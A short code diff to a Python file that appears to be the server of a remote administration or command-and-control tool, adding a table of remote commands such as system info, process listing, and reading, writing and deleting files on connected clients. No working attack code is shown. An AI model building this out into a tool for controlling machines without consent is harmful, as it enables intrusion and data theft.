@@ -2,7 +2,19 @@ import socket
 import threading
 import ctypes
 
-clients = {}  # store connected clients as {addr: socket}
+clients = {}  
+clientscmds = {
+    "sysinfo": "Get OS, username, uptime, CPU/RAM info",
+    "list_processes": "List running processes",
+    "hostname": "Get machine hostname",
+    "ls": "List directory contents",
+    "cd": "Change directory",
+    "read_file": "Read file contents",
+    "write_file": "Write to a file",
+    "delete_file": "Delete a file",
+    "mkdir": "Create a directory",
+
+}
 
 
 def logo():
